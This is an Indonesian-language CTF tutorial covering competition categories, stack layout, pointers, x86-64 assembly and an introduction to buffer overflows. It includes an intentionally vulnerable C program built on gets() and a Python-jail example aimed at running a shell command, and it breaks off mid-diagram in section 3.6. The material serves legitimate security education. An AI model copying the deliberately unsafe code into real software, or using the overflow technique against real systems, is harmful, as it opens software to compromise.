---
title: Readings
layout: page
---


---

## Daftar Isi

1. [Pengenalan CTF (Capture the Flag)](#1-pengenalan-ctf-capture-the-flag)
   - 1.1 [Apa Itu CTF?](#11-apa-itu-ctf)
   - 1.2 [Format CTF](#12-format-ctf)
   - 1.3 [Kategori CTF](#13-kategori-ctf)
     - 1.3.1 [PWN / Binary Exploitation](#131-pwn--binary-exploitation)
     - 1.3.2 [Web / Web Exploitation](#132-web--web-exploitation)
     - 1.3.3 [Reverse Engineering](#133-reverse-engineering)
     - 1.3.4 [Cryptography](#134-cryptography)
     - 1.3.5 [Forensics](#135-forensics)
     - 1.3.6 [Miscellaneous](#136-miscellaneous)
   - 1.4 [Alur Mengerjakan Soal CTF](#14-alur-mengerjakan-soal-ctf)
   - 1.5 [Platform Belajar CTF](#15-platform-belajar-ctf)
   - 1.6 [Tips Naik Level dengan Cepat](#16-tips-naik-level-dengan-cepat)

2. [Stack, Pointer & Assembly](#2-stack-pointer--assembly)
   - 2.1 [Cara Kerja Stack](#21-cara-kerja-stack)
   - 2.2 [Stack Frame](#22-stack-frame)
   - 2.3 [Stack Tumbuh ke Bawah](#23-stack-tumbuh-ke-bawah)
   - 2.4 [Memory dan Pointer di C](#24-memory-dan-pointer-di-c)
   - 2.5 [Hubungan Pointer dan Array](#25-hubungan-pointer-dan-array)
   - 2.6 [Hubungan Stack dan Pointer](#26-hubungan-stack-dan-pointer)
   - 2.7 [Assembly x86-64 dan Register Penting](#27-assembly-x86-64-dan-register-penting)
   - 2.8 [Instruksi `call` dan `ret`](#28-instruksi-call-dan-ret)
   - 2.9 [Membaca Assembly di GDB](#29-membaca-assembly-di-gdb)
   - 2.10 [Rangkuman Konsep Inti](#210-rangkuman-konsep-inti)

3. [Buffer Overflow](#3-buffer-overflow)
   - 3.1 [Apa Itu Buffer Overflow?](#31-apa-itu-buffer-overflow)
   - 3.2 [Anatomi Stack dan Return Address](#32-anatomi-stack-dan-return-address)
   - 3.3 [Mengapa Return Address Adalah Target Utama](#33-mengapa-return-address-adalah-target-utama)
   - 3.4 [Contoh Kode Vulnerable](#34-contoh-kode-vulnerable)
   - 3.5 [Fungsi-Fungsi Berbahaya vs Aman](#35-fungsi-fungsi-berbahaya-vs-aman)
   - 3.6 [Workflow Exploit Buffer Overflow](#36-workflow-exploit-buffer-overflow)
   - 3.7 [Menghitung Offset dengan Cyclic Pattern](#37-menghitung-offset-dengan-cyclic-pattern)
   - 3.8 [Memeriksa Proteksi Binary dengan checksec](#38-memeriksa-proteksi-binary-dengan-checksec)
   - 3.9 [Cara Mendapatkan Alamat Fungsi Target](#39-cara-mendapatkan-alamat-fungsi-target)
   - 3.10 [Menulis Exploit Pertama dengan pwntools](#310-menulis-exploit-pertama-dengan-pwntools)
   - 3.11 [Debugging dengan GDB + pwndbg](#311-debugging-dengan-gdb--pwndbg)
   - 3.12 [Little Endian — Hal yang Sering Terlupakan](#312-little-endian--hal-yang-sering-terlupakan)
   - 3.13 [Proteksi Binary dan Cara Melewatinya](#313-proteksi-binary-dan-cara-melewatinya)
   - 3.14 [Langkah Selanjutnya (Next Level)](#314-langkah-selanjutnya-next-level)
   - 3.15 [Referensi dan Sumber Belajar](#315-referensi-dan-sumber-belajar)

---
# Panduan Lengkap CTF, Stack, Pointer, Assembly & Buffer Overflow

> **Disusun berdasarkan materi:** Pengenalan CTF · Stack, Pointer & Assembly · Buffer Overflow  
> **Bahasa:** Indonesia Formal  
> **Tingkat:** Pemula hingga Menengah


# 1. Pengenalan CTF (Capture the Flag)

## 1.1 Apa Itu CTF?

**CTF (Capture the Flag)** adalah kompetisi keamanan siber di mana peserta bertugas mencari dan mengambil sebuah string teks tersembunyi yang disebut **"flag"**. Flag tersebut disembunyikan di dalam sistem, file, program, atau layanan jaringan yang sengaja dirancang dengan kerentanan tertentu.

### Bentuk Flag

Flag biasanya memiliki format yang mudah dikenali, seperti:

```
CTF{ini_adalah_flag_nya}
flag{h4ck3r_m0d3_on}
picoCTF{s3cur1ty_1s_fun}
```

### Analogi Sederhana

Bayangkan CTF seperti **lomba berburu harta karun**, tetapi:

| Elemen Lomba Biasa | Elemen CTF |
|--------------------|------------|
| Peta petunjuk | Deskripsi soal (challenge) |
| Harta karun | Flag (string teks) |
| Medan perlombaan | Sistem komputer / jaringan |
| Alat mencari | Skill hacking & tools |

CTF adalah cara yang **legal, etis, dan terstruktur** untuk belajar keamanan siber. Semua sistem yang diserang adalah milik penyelenggara dan sengaja dibuat rentan untuk tujuan edukasi.

---

## 1.2 Format CTF

Terdapat dua format utama dalam kompetisi CTF:

| Format | Cara Bermain | Contoh Kompetisi |
|--------|-------------|------------------|
| **Jeopardy** | Mengerjakan soal per kategori, mendapatkan poin untuk setiap flag yang ditemukan | PicoCTF, CTFtime |
| **Attack-Defense** | Menyerang server tim lain sambil mempertahankan server sendiri | DEF CON CTF Finals |

### Format Jeopardy (Yang Paling Umum untuk Pemula)

Format Jeopardy adalah format yang paling banyak digunakan, terutama untuk pemula. Setiap soal memiliki nilai poin yang berbeda tergantung tingkat kesulitannya:

| Tingkat Kesulitan | Rentang Poin |
|-------------------|-------------|
| Mudah | 50 – 100 poin |
| Menengah | 200 – 500 poin |
| Sulit | 500 – 1000 poin |

Dalam format ini, tim atau individu memilih soal mana yang ingin dikerjakan terlebih dahulu, sehingga strategi pengerjaan sangat memengaruhi hasil akhir.

---

## 1.3 Kategori CTF

Setiap soal CTF dikategorikan berdasarkan bidang ilmu keamanan siber yang diuji. Berikut adalah penjelasan mendalam dari masing-masing kategori:

### 1.3.1 PWN / Binary Exploitation

**Deskripsi:**  
Kategori ini melibatkan eksploitasi program biner (binary) yang sedang berjalan di server. Tujuan utamanya adalah mengambil alih kendali program tersebut untuk kemudian membaca flag dari sistem.

**Alur kerja umum:**
```
Koneksi ke server → Analisis binary → Temukan kerentanan → Kirim exploit → Dapatkan shell → Baca flag
```

Contoh koneksi ke server:
```bash
nc ctf.example.com 1337
# program berjalan di server
# kita kirim exploit
# dapatkan shell / baca flag
```

**Skill yang dibutuhkan:**
- Pemrograman bahasa C dan Assembly
- Pemahaman cara kerja stack dan heap
- Teknik eksploitasi: Buffer Overflow, ROP (Return-Oriented Programming), Heap Exploitation

**Tools utama:**

| Tool | Fungsi |
|------|--------|
| `pwntools` | Framework Python untuk menulis dan mengirim exploit |
| `gdb` | GNU Debugger, untuk analisis program saat berjalan |
| `pwndbg` | Plugin GDB yang menampilkan informasi stack/register dengan lebih jelas |
| `checksec` | Memeriksa proteksi keamanan pada binary |
| `ROPGadget` | Mencari gadget untuk teknik ROP chain |

---

### 1.3.2 Web / Web Exploitation

**Deskripsi:**  
Kategori ini berfokus pada eksploitasi kerentanan pada website dan aplikasi web.

**Teknik-teknik yang sering muncul:**

| Teknik | Penjelasan Singkat |
|--------|-------------------|
| **SQL Injection** | Memanipulasi query database melalui input yang tidak tersanitasi |
| **XSS (Cross-Site Scripting)** | Menyuntikkan kode JavaScript ke halaman web |
| **CSRF (Cross-Site Request Forgery)** | Memaksa pengguna melakukan aksi tanpa sepengetahuannya |
| **IDOR (Insecure Direct Object Reference)** | Mengakses data milik pengguna lain melalui manipulasi ID |
| **LFI/RFI (Local/Remote File Inclusion)** | Membaca atau mengeksekusi file dari server |
| **SSRF (Server-Side Request Forgery)** | Membuat server mengakses sumber daya internal yang seharusnya tidak dapat diakses dari luar |

**Tools utama:**

| Tool | Fungsi |
|------|--------|
| `Burp Suite` | Proxy dan toolkit untuk analisis lalu lintas HTTP |
| `sqlmap` | Otomatisasi deteksi dan eksploitasi SQL Injection |
| `curl` | Mengirim HTTP request dari command line |

---

### 1.3.3 Reverse Engineering

**Deskripsi:**  
Kategori ini menuntut peserta untuk menganalisis program tanpa memiliki source code-nya. Peserta mendapatkan file binary, kemudian harus memahami cara kerjanya untuk menemukan flag.

**Alur kerja:**
```
binary.exe / binary.elf
        ↓
   disassemble
        ↓
  assembly code
        ↓
rekonstruksi logika
        ↓
   dapatkan flag 🚩
```

**Tantangan yang sering muncul:**
- Algoritma enkripsi yang dibuat secara kustom
- Teknik anti-debugging
- Kode yang disamarkan (obfuscated code)
- Analisis malware ringan

**Tools utama:**

| Tool | Fungsi |
|------|--------|
| `Ghidra` | Decompiler gratis dari NSA, sangat populer |
| `IDA Pro` | Disassembler dan decompiler profesional |
| `radare2` | Framework analisis binary open source |
| `Binary Ninja` | Disassembler modern dengan antarmuka yang baik |
| `x64dbg` | Debugger untuk Windows (binary .exe) |

---

### 1.3.4 Cryptography

**Deskripsi:**  
Kategori ini menantang peserta untuk memecahkan sistem kriptografi yang lemah atau salah dalam implementasinya. Tidak selalu membutuhkan kemampuan matematika tingkat lanjut.

**Jenis tantangan yang sering muncul:**

| Tantangan | Contoh |
|-----------|--------|
| Classic Cipher | Caesar, Vigenere, ROT13 |
| RSA yang lemah | n kecil, e kecil, shared prime |
| XOR | Key reuse, known plaintext attack |
| Hash cracking | MD5/SHA1 collision, rainbow table |
| AES yang salah implementasi | Penggunaan ECB mode, IV reuse |
| Custom crypto | Algoritma buatan sendiri yang memiliki cacat logika |

**Tools utama:**

| Tool | Fungsi |
|------|--------|
| `CyberChef` | Swiss Army Knife untuk encoding/decoding/enkripsi di browser |
| `pycryptodome` | Library kriptografi untuk Python |
| `SageMath` | Sistem matematika untuk kriptografi berbasis bilangan |
| `hashcat` | Tool untuk memecahkan hash secara cepat |

---

### 1.3.5 Forensics

**Deskripsi:**  
Kategori ini berfokus pada analisis artefak digital untuk menemukan flag yang disembunyikan di dalamnya.

**Contoh soal:**  
*"Ini adalah file gambar JPG. Ada yang aneh. Temukan flagnya."*

```bash
file suspicious.jpg
strings suspicious.jpg | grep flag
steghide extract -sf suspicious.jpg
exiftool suspicious.jpg
```

**Sub-kategori yang sering muncul:**

| Sub-Kategori | Deskripsi |
|--------------|-----------|
| **File Analysis** | Analisis file aneh, hidden data, metadata tersembunyi |
| **Steganography** | Flag disembunyikan di dalam gambar atau audio |
| **Network Forensic** | Analisis file `.pcap` (packet capture dari Wireshark) |
| **Disk Forensic** | Analisis image disk dan file system |
| **Memory Forensic** | Analisis RAM dump dari sistem |
| **Log Analysis** | Mencari anomali atau jejak serangan pada log server |

**Tools utama:**

| Tool | Fungsi |
|------|--------|
| `Wireshark` | Analisis paket jaringan |
| `Autopsy` | Analisis forensik disk dan file system |
| `Volatility` | Analisis memory (RAM dump) |
| `binwalk` | Mengekstrak file tersembunyi di dalam file lain |
| `steghide` | Menyembunyikan/mengekstrak data dari gambar |
| `exiftool` | Membaca metadata file |

---

### 1.3.6 Miscellaneous

**Deskripsi:**  
Kategori "lain-lain" yang menampung soal-soal yang tidak masuk ke kategori manapun. Isinya bisa sangat beragam.

**Jenis tantangan:**

| Kategori | Deskripsi |
|----------|-----------|
| **OSINT** | Mencari informasi dari internet atau media sosial |
| **Programming** | Membuat script untuk menyelesaikan soal secara otomatis |
| **Game Hacking** | Memanipulasi game sederhana |
| **Hardware/IoT** | Analisis firmware, manipulasi sensor |
| **Puzzle** | Logic puzzle, encoding yang tidak umum |
| **Social Engineering** | Simulasi phishing, tantangan pretexting |
| **Jail/Sandbox Escape** | Melarikan diri dari restricted shell atau Python jail |

**Contoh soal Jail yang populer:**
```python
# Python jail – lo cuma bisa jalankan ini:
>>> eval(input())

# Tujuan: eksekusi os.system("cat flag.txt")
# tanpa mengetik kata "os", "system", atau "import"
# Bagaimana caranya? 😈
```

---

## 1.4 Alur Mengerjakan Soal CTF

Setiap kali mendapatkan sebuah soal CTF, ikuti alur berikut secara sistematis:

```
┌─────────────────────────────────────────────┐
│  1. BACA SOAL                               │
│     Pahami konteksnya, kategori apa,        │
│     ada hint tidak?                         │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  2. RECON                                   │
│     Kumpulkan informasi sebanyak mungkin    │
│     dari file/service yang diberikan        │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  3. ANALISIS                                │
│     Cari vulnerability / anomali /         │
│     keanehan dalam target                  │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  4. EXPLOIT / SOLVE                         │
│     Eksploitasi kerentanan atau pecahkan    │
│     puzzlenya                               │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  5. DAPATKAN FLAG                           │
│     Submit flag → poin masuk               │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  6. TULIS WRITEUP                           │
│     Dokumentasikan cara penyelesaian –     │
│     untuk pembelajaran tim dan komunitas   │
└─────────────────────────────────────────────┘
```

---

## 1.5 Platform Belajar CTF

| Platform | Kategori | Level | Gratis? |
|----------|----------|-------|---------|
| **pwn.college** | PWN (khusus) | Pemula → Pro | ✅ Ya |
| **PicoCTF** | Semua | Pemula | ✅ Ya |
| **HackTheBox** | Semua | Menengah → Sulit | ⚠️ Sebagian |
| **TryHackMe** | Semua | Pemula | ⚠️ Sebagian |
| **pwnable.kr** | PWN | Menengah → Sulit | ✅ Ya |
| **CTFtime.org** | Semua | Variatif | ✅ Ya |
| **CryptoHack** | Crypto | Pemula → Pro | ✅ Ya |

> **Rekomendasi untuk pemula:** Mulailah dari **PicoCTF** untuk membiasakan diri dengan berbagai kategori, kemudian lanjut ke **pwn.college** jika tertarik mendalami binary exploitation secara terstruktur.

---

## 1.6 Tips Naik Level dengan Cepat

### Yang Harus Dilakukan (DO ✅)

- **Fokus pada 1–2 kategori terlebih dahulu**, jangan loncat-loncat ke semua kategori sekaligus
- **Baca writeup milik orang lain** setelah soal selesai atau kompetisi berakhir
- **Buat writeup sendiri**, sekecil apapun pencapaiannya — ini memperkuat pemahaman
- **Bermain bersama tim** dan saling berbagi ilmu
- **Ulangi soal yang gagal** sampai benar-benar memahaminya

### Yang Harus Dihindari (DON'T ❌)

- **Melewati soal mudah** karena merasa gengsi atau terlalu percaya diri
- **Langsung mencari writeup** sebelum mencoba sendiri terlebih dahulu
- **Bermain sendiri terus-menerus** tanpa mau berdiskusi dengan komunitas
- **Menyerah terlalu cepat** — 30 menit stuck itu normal, teruslah mencoba

---

# 2. Stack, Pointer & Assembly

## 2.1 Cara Kerja Stack

Stack adalah struktur data yang bekerja layaknya **tumpukan piring**: piring yang diletakkan paling terakhir adalah yang diambil pertama kali. Konsep ini dikenal dengan nama **LIFO (Last In, First Out)**.

```
[ Piring paling atas = paling baru ]
┌─────────────────────────────────────┐
│           fungsi C()                │ ← ditaruh paling terakhir
├─────────────────────────────────────┤
│           fungsi B()                │
├─────────────────────────────────────┤
│           fungsi A()                │ ← dipanggil pertama
├─────────────────────────────────────┤
│            main()                   │ ← dasar tumpukan
└─────────────────────────────────────┘
```

**Dua operasi dasar pada stack:**

| Operasi | Arah | Penjelasan |
|---------|------|------------|
| `PUSH` | Masuk (tumpuk ke atas) | Menambahkan data baru ke stack |
| `POP` | Keluar (ambil dari atas) | Mengambil data paling atas dari stack |

Dalam konteks program komputer, stack digunakan untuk menyimpan:
- Variabel lokal dari sebuah fungsi
- Alamat pengirim (return address) — ke mana program harus kembali setelah fungsi selesai
- Nilai-nilai register yang perlu disimpan sementara

---

## 2.2 Stack Frame

Setiap kali sebuah fungsi dipanggil, CPU membuat **stack frame** tersendiri. Stack frame adalah "ruangan" atau "konteks" milik satu fungsi di dalam stack.

**Isi dari sebuah stack frame (dari atas ke bawah):**

```
┌────────────────────────────────────────────────────────┐
│              return address                            │  → ke mana CPU kembali setelah fungsi selesai
├────────────────────────────────────────────────────────┤
│              saved RBP                                 │  → menyimpan posisi frame fungsi pemanggil
├────────────────────────────────────────────────────────┤
│                                                        │
│            local variables                             │  → variabel lokal fungsi ini
│              char buf[64]                              │
│              int x                                     │
│                                                        │
└────────────────────────────────────────────────────────┘
```

**Dua register kunci yang mengatur stack frame:**

| Register | Nama | Fungsi |
|----------|------|--------|
| `RSP` | Stack Pointer | Selalu menunjuk ke **puncak stack** (posisi terkini) |
| `RBP` | Base Pointer | Menunjuk ke **dasar frame fungsi ini** — titik referensi tetap selama fungsi berjalan |

---

## 2.3 Stack Tumbuh ke Bawah

Ini adalah konsep yang sering membingungkan pemula: **stack di arsitektur x86-64 tumbuh ke arah alamat yang lebih rendah (lower address)**, bukan ke atas.

```
Alamat rendah (0x0000...)
        ↑
        │
  [ RSP ]  ← puncak stack (alamat terendah yang aktif)
        │
        ↓  stack tumbuh ke SINI (ke alamat rendah)
  [ RBP ]  ← dasar frame
        │
        │
[ return address ]
        │
Alamat tinggi (0xffff...)
```

**Konsekuensi penting:**

- Setiap kali instruksi `PUSH` dieksekusi → RSP **dikurangi 8** (bukan ditambah), lalu nilai disimpan
- Setiap kali instruksi `POP` dieksekusi → nilai diambil dari RSP, lalu RSP **ditambah 8**
- "Puncak" stack **bukan** di alamat tertinggi, melainkan di alamat terendah yang sedang aktif — yaitu di mana RSP menunjuk

> **Analogi:** Bayangkan sebuah lift yang turun saat penumpang baru naik. Lantai paling bawah adalah posisi terkini (puncak stack), dan setiap penumpang baru membuat lift turun satu lantai lagi.

---

## 2.4 Memory dan Pointer di C

### Memory

Memory komputer dapat dibayangkan sebagai **array raksasa yang setiap elemennya memiliki nomor urut (alamat)**. Setiap alamat menyimpan satu byte data.

```
Alamat →   0x100   0x101   0x102   0x103   0x104
         ┌───────┬───────┬───────┬───────┬───────┐
Isi    → │  41   │  42   │  43   │  00   │  ??   │
         └───────┴───────┴───────┴───────┴───────┘
                     ↑
                  "ABC\0"
```

### Pointer

**Pointer** adalah variabel yang menyimpan **alamat memory** (bukan nilai langsung). Pointer adalah cara C untuk mengacu ke lokasi tertentu di memory.

```c
int x = 42;
int *p = &x;   // p menyimpan ALAMAT x, bukan nilai x

printf("%d", x);    // → 42       (nilai langsung)
printf("%p", p);    // → 0x7fff...  (alamat x)
printf("%d", *p);   // → 42       (dereference: ambil nilai dari alamat)
```

**Penjelasan operator pointer:**

| Operator | Nama | Fungsi |
|----------|------|--------|
| `&` | Address-of | Mengambil alamat sebuah variabel |
| `*` | Dereference | Mengambil nilai yang berada di sebuah alamat |

---

## 2.5 Hubungan Pointer dan Array

Dalam bahasa C, **nama array sebenarnya adalah pointer ke elemen pertama** dari array tersebut. Ini adalah fakta fundamental yang menjadi dasar dari banyak teknik eksploitasi.

```c
char nama[5] = "Andi";

// Ketiga cara berikut menghasilkan nilai yang sama:
nama[0]      == 'A'   // notasi array
*(nama + 0)  == 'A'   // notasi pointer dengan offset 0
*nama        == 'A'   // dereference langsung

nama[1]      == 'n'   // elemen kedua
*(nama + 1)  == 'n'   // pointer + offset 1
```

**Implikasi dalam buffer overflow:**

```c
char buf[64];
// buf == &buf[0] == alamat awal buffer

// Ketika buffer overflow terjadi:
// Kita menulis mulai dari buf[0]
// Melewati batas 64 byte
// Terus menulis ke atas... menabrak saved RBP
// Terus menulis lagi... menabrak return address ← TARGET
```

---

## 2.6 Hubungan Stack dan Pointer

Perhatikan contoh kode berikut dan bagaimana ia terpeta di memory:

```c
void login() {
    char buffer[8];   // dialokasikan di stack
    gets(buffer);     // menulis ke alamat buffer
}
```

**Visualisasi di memory ketika `login()` dipanggil:**

```
RSP →  [ buffer[0] ]  ← kita mulai menulis dari sini
       [ buffer[1] ]
       [ buffer[2] ]
       [ buffer[3] ]     Alamat
       [ buffer[4] ]     Meningkat
       [ buffer[5] ]     ke bawah
       [ buffer[6] ]
       [ buffer[7] ]
RBP →  [ saved RBP ]  ← +8 byte dari awal buffer
       [ ret addr   ]  ← +16 byte dari awal buffer (TARGET EXPLOIT)
```

Ini menjelaskan mengapa overflow dari buffer bisa menimpa return address — keduanya berada di stack secara berdekatan, dan penulisan data dari C tidak secara otomatis memeriksa batas.

---

## 2.7 Assembly x86-64 dan Register Penting

### Instruksi Assembly Dasar

Tidak perlu menghafal semua instruksi. Cukup pahami yang berikut:

```asm
mov rax, 5       ; Isi register RAX dengan nilai 5
push rax         ; Simpan (push) nilai RAX ke dalam stack
pop rax          ; Ambil (pop) nilai dari stack, simpan kembali ke RAX

call fungsi      ; Simpan return address ke stack dan lompat ke label 'fungsi'
ret              ; Ambil return address dari stack dan lompat ke alamat tersebut

add rax, 1       ; Tambahkan 1 ke register RAX (RAX = RAX + 1)
cmp rax, rbx     ; Bandingkan nilai di RAX dengan nilai di RBX
jmp 0x401196     ; Lompat (jump) secara absolut ke alamat memori 0x401196
```

### Register yang Sering Muncul

```
┌────────┬──────────────────────────────────────────────────────────┐
│ RAX    │ → Return value fungsi / hasil operasi aritmatika         │
├────────┼──────────────────────────────────────────────────────────┤
│ RBX    │ → General purpose (serbaguna)                            │
├────────┼──────────────────────────────────────────────────────────┤
│ RCX    │ → Counter (biasa digunakan untuk loop)                   │
├────────┼──────────────────────────────────────────────────────────┤
│ RDX    │ → Data / Argument ke-3 pada pemanggilan fungsi           │
├────────┼──────────────────────────────────────────────────────────┤
│ RSI    │ → Argument ke-2 pada pemanggilan fungsi                  │
├────────┼──────────────────────────────────────────────────────────┤
│ RDI    │ → Argument ke-1 [PENTING UNTUK EXPLOIT]                 │
├────────┼──────────────────────────────────────────────────────────┤
│ RSP    │ → Stack Pointer [PENTING UNTUK EXPLOIT]                  │
├────────┼──────────────────────────────────────────────────────────┤
│ RBP    │ → Base Pointer (dasar frame fungsi saat ini)             │
├────────┼──────────────────────────────────────────────────────────┤
│ RIP    │ → Instruction Pointer ← TARGET UTAMA CORRUPTION          │
└────────┴──────────────────────────────────────────────────────────┘
```

> **Hal terpenting:** Register `RIP` menunjuk ke **instruksi yang sedang dieksekusi**. Jika seseorang dapat mengendalikan nilai `RIP`, maka ia dapat mengendalikan **alur eksekusi** seluruh program.

---

## 2.8 Instruksi `call` dan `ret`

Instruksi `call` dan `ret` adalah inti dari cara fungsi bekerja di level assembly. Memahami keduanya adalah kunci untuk memahami buffer overflow.

### Ketika `call fungsi()` Dieksekusi:

```
1. CPU menyimpan (push) alamat instruksi BERIKUTNYA ke stack
   → Ini yang disebut "return address"
2. CPU melompat ke alamat awal fungsi yang dipanggil
```

### Ketika `ret` Dieksekusi:

```
1. CPU mengambil (pop) nilai dari puncak stack
2. CPU melompat ke alamat yang baru saja diambil tersebut
```

### Kesimpulan Kunci

```
ret = pop RIP
```

Jika kita dapat **mengendalikan nilai di puncak stack pada saat `ret` dieksekusi**, maka kita mengendalikan ke mana program akan melompat selanjutnya. Dan itulah **persis yang kita lakukan dalam serangan buffer overflow**.

---

## 2.9 Membaca Assembly di GDB

Untuk menganalisis sebuah fungsi di GDB:

```bash
gdb ./vuln
(gdb) disas login
```

Contoh output:
```asm
Dump of assembler code for function login:
   0x00401162 <+0>:    push   rbp
   0x00401163 <+1>:    mov    rbp, rsp
   0x00401166 <+4>:    sub    rsp, 0x48     ← alokasi buffer 72 byte
   0x0040116a <+8>:    lea    rax, [rbp-0x40] ← alamat buffer
   0x0040116e <+12>:   mov    rdi, rax
   0x00401171 <+15>:   call   0x401040 <gets@plt>  ← panggil gets()
   0x00401176 <+20>:   nop
   0x00401177 <+21>:   leave
   0x00401178 <+22>:   ret                  ← di sinilah exploit kita bekerja
```

**Cara membaca informasi penting:**

- `sub rsp, 0x48` → Buffer dialokasikan 72 byte (0x48 = 72 dalam desimal) dari RSP
- `lea rax, [rbp-0x40]` → Buffer dimulai dari RBP - 64 (0x40 = 64)
- Offset ke return address = 64 (ukuran buffer) + 8 (saved RBP) = **72 byte**

> **Catatan:** Selisih antara alokasi RSP dan posisi buffer di RBP dapat berbeda karena alignment. Gunakan cyclic pattern untuk mendapatkan offset yang tepat.

---

## 2.10 Rangkuman Konsep Inti

| Konsep | Definisi |
|--------|----------|
| **Stack** | Area memory tempat variabel lokal dan return address disimpan |
| **Stack Frame** | "Ruangan" atau konteks milik setiap fungsi di dalam stack |
| **RSP / RBP** | Register penunjuk (pointer) ke posisi stack saat ini |
| **RIP** | Register yang menunjuk ke instruksi yang sedang dieksekusi |
| **Pointer** | Variabel umum yang menyimpan alamat memory |
| **Return Address** | "Peta jalan" untuk kembali ke fungsi pemanggil setelah selesai |
| **RET (Instruksi)** | Perintah CPU untuk mengambil nilai dari stack dan melompat ke sana |

**Hubungan ke Buffer Overflow:**

```
Buffer ada di stack
      ↓
Kita menulis terlalu banyak data
      ↓
Return address ikut tertimpa
      ↓
Instruksi RET melompat ke alamat yang kita tentukan
      ↓
Program dikendalikan penyerang
```

---

# 3. Buffer Overflow

## 3.1 Apa Itu Buffer Overflow?

**Buffer overflow** terjadi ketika sebuah program menulis data **melebihi kapasitas buffer** yang telah dialokasikan, sehingga data tersebut "meluber" ke area memory di sekitarnya.

**Definisi singkat:**
- **Buffer** = kotak penyimpanan data di memory dengan ukuran tertentu
- **Overflow** = isi melebihi kapasitas, meluber ke data lain di sekitarnya

```c
char nama[8];
strcpy(nama, "AAAAAAAAAAAAAAAAAAAA"); // 20 byte masuk ke kotak 8 byte
```

**Analogi visual:**

```
Kotak 8 byte (kapasitas normal):
┌───┬───┬───┬───┬───┬───┬───┬───┐
│ A │ n │ d │ i │\0 │   │   │   │
└───┴───┴───┴───┴───┴───┴───┴───┘

Setelah overflow (20 byte dimasukkan):
┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐
│ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │ A │
└───┴───┴───┴───┴───┴───┴───┴───┘---┴───┴───┴───┴───┘   ↑ data ini menimpa memory lain
      8 byte pertama (batas)      saved RBP   return addr ← TERTIMPA!
```

---

## 3.2 Anatomi Stack dan Return Address

Perhatikan layout stack ketika sebuah fungsi dengan buffer dipanggil:

```
[ HIGHER ADDRESS / ALAMAT TINGGI ]

┌──────────────────────────────────────────────┐
│                 argv, env                    │
├──────────────────────────────────────────────┤
│             return address                   │ ← TARGET KITA
├──────────────────────────────────────────────┤
│               saved RBP                      │
├──────────────────────────────────────────────┤
│                                              │
│             buffer[64]                       │ ← kita mengisi dari sini
│                                              │
└──────────────────────────────────────────────┘

[ LOWER ADDRESS / ALAMAT RENDAH ]

ARAH PENULISAN DATA: dari bawah ke atas ↑
ARAH PERTUMBUHAN STACK: dari atas ke bawah ↓
```

**Kunci:** Stack tumbuh ke bawah, tetapi kita menulis data dari alamat rendah ke alamat tinggi (ke atas). Inilah yang memungkinkan overflow dari buffer bisa menabrak return address yang berada di atasnya dalam address space.

---

## 3.3 Mengapa Return Address Adalah Target Utama

Ketika sebuah fungsi selesai dieksekusi, CPU membaca return address dari stack dan melompat ke sana. Proses ini terjadi melalui instruksi `ret`.

**Alur normal:**

```
main() memanggil login()
   → CPU push "alamat instruksi berikutnya di main" ke stack
   → CPU lompat ke awal login()
   → login() berjalan...
   → login() selesai, instruksi ret dieksekusi
   → CPU pop return address dari stack
   → CPU lompat kembali ke main()  ✅
```

**Alur setelah overflow berhasil:**

```
Penyerang mengirim input panjang yang menimpa return address
   → CPU push "alamat instruksi berikutnya di main" ke stack
   → CPU lompat ke awal login()
   → login() berjalan, buffer overflow menimpa return address
   → login() "selesai", instruksi ret dieksekusi
   → CPU pop return address dari stack (tapi sudah TERTIMPA)
   → CPU lompat ke alamat pilihan penyerang  ✅ (dari sudut penyerang)
```

---

## 3.4 Contoh Kode Vulnerable

Berikut adalah contoh program C yang memiliki kerentanan buffer overflow:

```c
#include <stdio.h>
#include <string.h>

void rahasia() {
    printf("Selamat! Lo masuk fungsi rahasia!\n");
    // Dalam CTF, biasanya: system("/bin/sh") atau cetak flag
}

void login() {
    char buffer[64];
    printf("Masukkan nama: ");
    gets(buffer);   // ← BAHAYA! gets() tidak memeriksa panjang input
}

int main() {
    login();
    return 0;
}
```

**Analisis kerentanan:**
- Fungsi `rahasia()` **tidak pernah dipanggil** dari `main()`
- Namun, karena `gets()` tidak memeriksa panjang input, kita bisa menimpa return address di `login()` dengan alamat `rahasia()`
- Ketika `login()` selesai dan menjalankan `ret`, program akan melompat ke `rahasia()` alih-alih kembali ke `main()`

**Tujuan exploit:** Memanggil `rahasia()` tanpa mengubah source code, hanya melalui input.

---

## 3.5 Fungsi-Fungsi Berbahaya vs Aman

| Fungsi | Aman? | Alasan |
|--------|-------|--------|
| `gets(buf)` | ❌ Tidak aman | Tidak ada limit panjang sama sekali. Sudah **deprecated** sejak C99 |
| `scanf("%s", buf)` | ❌ Tidak aman | Sama seperti gets, tidak ada limit panjang untuk format `%s` |
| `strcpy(dst, src)` | ❌ Tidak aman | Tidak memeriksa ukuran buffer tujuan |
| `strcat(dst, src)` | ❌ Tidak aman | Tidak memeriksa ukuran buffer tujuan |
| `fgets(buf, 64, stdin)` | ✅ Aman | Ada parameter limit ukuran yang eksplisit |
| `read(0, buf, 64)` | ✅ Aman | Ukuran baca ditentukan secara eksplisit |
| `strncpy(dst, src, n)` | ✅ Aman | Ada parameter limit n |

> **Catatan untuk CTF:** Meskipun berbahaya dalam dunia nyata, fungsi-fungsi seperti `gets()` dan `strcpy()` sengaja digunakan dalam soal CTF untuk menciptakan kerentanan yang perlu dieksploitasi peserta.

---

## 3.6 Workflow Exploit Buffer Overflow

Berikut adalah alur kerja standar untuk mengeksploitasi kerentanan buffer overflow:

```
┌───────────────────────────────────────────┐
│   1. Temukan Fungsi Vulnerable            │
│      (gets, strcpy, scanf, dll.)          │
└────────────────────┬──────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────┐    ← Gunakan GDB atau
│   2. Hitung Offset ke Return Address      │       pwntools untuk
│      (Pattern Create / De Bruijn Sequence)│       mencari jarak tepat
└────────────────────┬──────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────┐
